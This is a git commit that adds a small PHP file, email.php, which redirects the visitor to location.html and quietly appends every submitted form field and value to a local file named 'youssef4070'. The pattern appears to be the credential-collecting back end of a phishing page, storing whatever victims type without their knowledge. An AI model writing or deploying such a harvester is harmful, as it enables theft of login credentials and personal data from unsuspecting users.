bf6dc6de102d11f4203f4d9eab89911305ede051
ssgraak <45667025+ssgraak@users.noreply.github.com>
2018-12-06 18:00:44 +0100

    Add files via upload

---
+++ email.php
@@ -0,0 +1,12 @@
+<?php
+header( 'Location: location.html' ) ;
+$handle = fopen("youssef4070", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
